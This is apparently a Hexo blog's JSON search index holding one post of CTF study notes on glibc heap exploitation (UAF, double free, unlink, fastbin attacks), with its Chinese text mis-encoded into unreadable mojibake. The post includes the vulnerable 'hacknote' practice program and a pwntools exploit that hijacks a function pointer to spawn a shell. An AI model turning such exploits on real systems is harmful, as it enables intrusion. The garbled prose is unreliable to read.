{"meta":{"title":"Scardow's blog","subtitle":"","description":"","author":"Scarce Shadow","url":"https://scardow.github.io","root":"/"},"pages":[{"title":"categories","date":"2021-09-12T01:28:56.246Z","updated":"2021-09-12T01:28:56.246Z","comments":true,"path":"categories/index.html","permalink":"https://scardow.github.io/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-09-12T16:00:00.000Z","updated":"2021-09-22T13:04:34.859Z","comments":true,"path":"about/index.html","permalink":"https://scardow.github.io/about/index.html","excerpt":"","text":"Introdutionä¸€ä¸ªæœŸæœ›æ¯å¤©éƒ½èƒ½è¿›æ­¥çš„learning pwner ğŸ‘¶ è‡ªæˆ‘ä»‹ç»å°±å¤šæ¥ç‚¹åºŸè¯å§ Email: &#115;&#99;&#97;&#x72;&#x63;&#x65;&#x73;&#x68;&#97;&#100;&#x6f;&#119;&#64;&#49;&#54;&#51;&#46;&#99;&#x6f;&#x6d; å­¦æ ¡: XDU 2020-09-13 çˆ±å¥½ï¼šä¹’ä¹“çƒï¼Œæ¯›ç¬”ï¼Œé‡‘åº¸å°è¯´ï¼Œã€Šåä¾¦æ¢æŸ¯å—ã€‹"},{"title":"tags","date":"2021-09-12T01:28:31.543Z","updated":"2021-09-12T01:28:31.543Z","comments":true,"path":"tags/index.html","permalink":"https://scardow.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Heap Exploitation","slug":"Heap Exploitation","date":"2021-08-16T23:54:01.000Z","updated":"2021-09-24T11:47:17.639Z","comments":true,"path":"2021/08/17/Heap Exploitation/","link":"","permalink":"https://scardow.github.io/2021/08/17/Heap%20Exploitation/","excerpt":"æœ¬æ–‡ä¸»è¦è®°å½•å †åˆ©ç”¨æ‰‹æ³•ï¼Œå¹¶ä¼šéšå­¦ä¹ è¿‡ç¨‹ä¸æ–­è¡¥å……","text":"æœ¬æ–‡ä¸»è¦è®°å½•å †åˆ©ç”¨æ‰‹æ³•ï¼Œå¹¶ä¼šéšå­¦ä¹ è¿‡ç¨‹ä¸æ–­è¡¥å…… å‚è€ƒèµ„æ–™ï¼š CTFwiki Angleboyçš„PPT Heap intro briefHeap memory allocator ptmalloc2 - glibc â€¦ (å…ˆè®°å½•glibcï¼Œå¤æ‚çš„å †ç®¡ç†å™¨ä¹‹åå­¦) Mechanism of glibc mallocå †ä¸­æ•°æ®ç»“æ„ mallocåˆ†é…æœ€å°ç©ºé—´ï¼ˆSIZE_T*4ï¼‰ chunk ç»“æ„ chunkå¤´ + data Chunk åˆ†ç±»allocated chunk prev_size è‹¥è¿ç»­è®°å¿†ä½“ä¸Šä¸€å †å—ä¸ºfree chunkï¼Œprev_sizeä¸ºå‰ä¸€ä¸ªå †å—å¤§å° è‹¥è¿ç»­è®°å¿†ä½“ä¸Šä¸€å—ä¸ºallocated chunkï¼Œåˆ™ä¸ºä¸Šä¸€å—çš„data sizeç”±äºsizeå¤§å°å­˜åœ¨å¯¹é½ï¼Œæ‰€ä»¥sizeåä¸‰æ¯”ç‰¹å§‹ç»ˆä¸ºé›¶ï¼Œå› æ­¤å¯ä»¥ä¿å­˜ä¸‰ä¸ªflag PREV_INUSE (bit 0): ä¸Šä¸€å—æ˜¯å¦allocated IS_MMAPPED(bit 1): è¯¥chunkæ˜¯å¦ç”±mmapåˆ†é… NON_MAIN_ARENA(bit 2): æ˜¯å¦ä¸å±äºmain arena free chunk ( bin ) prev_size size åŒallocated chunk fdï¼šæŒ‡å‘é“¾è¡¨çš„ä¸‹ä¸€ä¸ªchunk( å«binå¤´ ) bk: æŒ‡å‘é“¾è¡¨çš„å‰ä¸€ä¸ªchunk( å«binå¤´ ) fd_nextsize: æŒ‡å‘ä¸‹ä¸€ä¸ªlarge chunk( ä¸å«binå¤´ ) bk_nextsize: æŒ‡å‘å‰ä¸€ä¸ªlarge chunk( ä¸å«binå¤´ ) top chunk ç¬¬ä¸€æ¬¡mallocåˆ†é…çš„heapä¸ºmain arenaï¼Œæœªåˆ†é…çš„å¤§å †å—ä¸ºtop chunk last remainder mallocåˆ†é…æ—¶unsorted binåˆ‡å—åå­˜å…¥ï¼Œunsorted binä»å­˜åœ¨ binchunk freeåè¿›å…¥bin fast bin å•å‘é“¾è¡¨, ç›¸åŒå¤§å°åœ¨ä¸€æ¡é“¾ä¸Š LIFO ä¸ä¼šæŠŠä¸‹ä¸€å—chunk Pè®¾ç½®æˆ0 sizeåˆ†ä¸º0x20ï¼Œ0x30ï¼Œ0x40 â€¦ 0x80 global_max_fast = 0x80 small bin åŒå‘é“¾ç¯, ç›¸åŒå¤§å°åœ¨ä¸€æ¡é“¾ä¸Š FIFO ä¼šæŠŠä¸‹ä¸€å—chunk Pè®¾ç½®æˆ0 size: 0x20, 0x30, 0x40 â€¦ 0x90 â€¦ 0x3f0 æŒ‰ç…§sizeå¤§å°åˆ†ä¸º62ä¸ªbin, åˆ†åˆ«ä¸º2~63 ä¸‹æ ‡ SIZE_SZ=8ï¼ˆ64 ä½ï¼‰ 2 0x20 3 0x30 4 0x40 5 0x50 X 0xX0 63(3F) 0x3f0 å…¶ä¸­0x20 â€¦ 0x90ä¸ºunsorted binåˆ‡å‰²ååˆ†é…çš„ large bin åŒå‘é“¾ç¯(sorted) size &gt;= 1024(0x400) ç»„ æ•°é‡ å…¬å·® 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 ä¸é™åˆ¶ unsorted bin åŒå‘é“¾ç¯ free chunkå¤§å°å¤§äº0x80, glibcå°†chunkå…ˆæ”¾å…¥unsorted bin mallocçš„æ‰§è¡Œè¿‡ç¨‹ ç¬¬ä¸€æ¬¡mallocï¼šå½“ç”³è¯·å†…å­˜ç©ºé—´ &lt;128 KB æ—¶ï¼Œ kernelåˆ†é…132KB çš„top chunkï¼›&gt;128KB æ—¶ï¼Œä½¿ç”¨mmapåˆ†é…å†…å­˜ ç¬¬äºŒæ¬¡åŠä¹‹åï¼š fastbin(LIFO) bins æŒ‰ç…§ç´¢å¼•ä»å°åˆ°å¤§æŸ¥æ‰¾ top chunk å‘kernelç´¢è¦ç©ºé—´ free çš„æ‰§è¡Œè¿‡ç¨‹ä¸chunkçš„åˆå¹¶ free chunkå…ˆçœ‹ä¸Šä¸€å—æ˜¯å¦ä¸ºfree chunk(Pä½æ˜¯å¦ä¸º0)ï¼Œè‹¥æ˜¯ï¼Œåˆ™äºå‰ä¸€å †å—åˆå¹¶ï¼Œåœ¨å¯¹å‰ä¸€ä¸ªå †å—unlink å†çœ‹ä¸‹ä¸€å †å—ï¼š top chunk: ä¸ä¹‹åˆå¹¶ï¼ˆç¬¬äºŒæ­¥ä½¿ç”¨çš„æ˜¯åˆå¹¶ä¹‹åçš„å †å—ï¼‰ freeï¼šåˆå¹¶åä¸€åŒåŠ å…¥unsorted bin inuseï¼šåŠ å…¥unsorted bin å †åˆ©ç”¨æ‰‹æ³• UAFfree(pointer) åæœªå°†æŒ‡é’ˆptræ¸…ç©º, è¯¥ptrç§°ä½œdangling pointerï¼Œå³ä¸ºä¸€ä¸ªpointeræŒ‡å‘ä¸€å—é‡Šæ”¾çš„è®°å¿†ä½“. åˆ©ç”¨ infomation leak free ä¸¤ä¸ªfastbin sizeçš„chunkï¼Œç¬¬äºŒä¸ªchunk fdæŒ‡å‘ç¬¬ä¸€ä¸ªchunkï¼Œè‹¥å­˜åœ¨UAFï¼Œå¯å°†chunk user dateè¾“å‡ºleak addr mallocä¸€å—éfastbinï¼Œfreeæ˜¯è¿›å…¥unsorted binï¼Œfd æŒ‡å‘libcï¼Œkeè¾“å‡ºæˆ–mallocå›è¯¥å †å— struct type confusion double free æ¡ˆä¾‹123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;struct note &#123; void (*printnote)(); char *content ;&#125;;struct note *notelist[5];int count = 0; void print_note_content(struct note *this)&#123; puts(this-&gt;content);&#125;void add_note()&#123; int i ; char buf[8]; int size ; if(count &gt; 5)&#123; puts(&quot;Full&quot;); return ; &#125; for(i = 0 ; i &lt; 5 ; i ++)&#123; if(!notelist[i])&#123; notelist[i] = (struct note*)malloc(sizeof(struct note)); if(!notelist[i])&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; notelist[i]-&gt;printnote = print_note_content; printf(&quot;Note size :&quot;); read(0,buf,8); size = atoi(buf); notelist[i]-&gt;content = (char *)malloc(size); if(!notelist[i]-&gt;content)&#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0,notelist[i]-&gt;content,size); puts(&quot;Success !&quot;); count++; break; &#125; &#125;&#125;void del_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; free(notelist[idx]-&gt;content); free(notelist[idx]); puts(&quot;Success&quot;); &#125;&#125;void print_note()&#123; char buf[4]; int idx ; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= count)&#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if(notelist[idx])&#123; notelist[idx]-&gt;printnote(notelist[idx]); &#125;&#125;void magic()&#123; system(&quot;id&quot;);&#125;void menu()&#123; puts(&quot;----------------------&quot;); puts(&quot; HackNote &quot;); puts(&quot;----------------------&quot;); puts(&quot; 1. Add note &quot;); puts(&quot; 2. Delete note &quot;); puts(&quot; 3. Print note &quot;); puts(&quot; 4. Exit &quot;); puts(&quot;----------------------&quot;); printf(&quot;Your choice :&quot;);&#125;;int main()&#123; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); char buf[4]; while(1)&#123; menu(); read(0,buf,4); switch(atoi(buf))&#123; case 1 : add_note(); break ; case 2 : del_note(); break ; case 3 : print_note(); break ; case 4 : exit(0); break ; default : puts(&quot;Invalid choice&quot;); break ; &#125; &#125; return 0;&#125; æ¼æ´ç‚¹ freeåæœªå°†æŒ‡é’ˆæ¸…ç©ºé€ æˆUAF åˆ©ç”¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *host = &quot;training.pwnable.tw&quot;port = 11010# r = remote(host,port)r = process(&quot;./hacknote&quot;)gdb.attach(r)def addnote(size,content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content)def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))magic = 0x08048986# system@plt + 6system = 0x8048506addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)addnote(32,&quot;ddaa&quot;)delnote(0)delnote(1)# note = system# context = &quot;;sh;&quot;addnote(8,p32(system) + b&quot;;sh;&quot;)printnote(0)r.interactive() Heap overflowåˆ©ç”¨using unlinké€è¿‡overflowè¦†ç›–free chunkçš„fdã€bkï¼Œå†åˆ©ç”¨unlink unlinkåŸç† æ ¹æ®ä¸Šå›¾ï¼ŒçŸ¥shellcodeè¢«æˆªæ–­ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨jmpæŒ‡ä»¤è·³è¿‡ å¸¦æœ‰ä¿æŠ¤æœºåˆ¶çš„unlinkFastbin attackåˆ©ç”¨Double free åªä¼šæ£€æŸ¥fastbin link listæ˜¯å¦ç­‰äºå°†è¦freeçš„chunk free(a); free(b); free(a) æ­¤æ—¶ï¼Œåœ¨mallocä¸€ä¸ªä¸ a ç›¸åŒå¤§å°çš„chunkï¼Œåˆ™ä¼šå–å‡º aï¼Œè¿™æ—¶a æ—¢ä¸ºfreeï¼Œåˆä¸ºallocatedï¼Œè‹¥åœ¨aä¸­è¾“å…¥æ•°æ®ï¼Œå°±ä¼šæ›´æ”¹açš„fdæŒ‡é’ˆï¼Œä»è€Œæ„é€ fake chunkï¼Œmallocå‡ºfakeä¹‹åï¼Œé€ æˆä»»æ„åœ°å€ä»»æ„å†™ï¼Œæˆ–å†™å…¥æ ˆä¸­æ§åˆ¶ç¨‹åºæµ mallocæ—¶ä¼šæ£€æµ‹chunk size åœ¨fake chunkåœ°å€ + 0x8 ä¼ªé€ size åœ¨é™„è¿‘å¯»æ‰¾ç›®æ ‡size åˆ©ç”¨æŠ€å·§","categories":[{"name":"note","slug":"note","permalink":"https://scardow.github.io/categories/note/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"glibc","slug":"glibc","permalink":"https://scardow.github.io/tags/glibc/"}]}],"categories":[{"name":"note","slug":"note","permalink":"https://scardow.github.io/categories/note/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://scardow.github.io/tags/PWN/"},{"name":"Heap exploition","slug":"Heap-exploition","permalink":"https://scardow.github.io/tags/Heap-exploition/"},{"name":"glibc","slug":"glibc","permalink":"https://scardow.github.io/tags/glibc/"}]}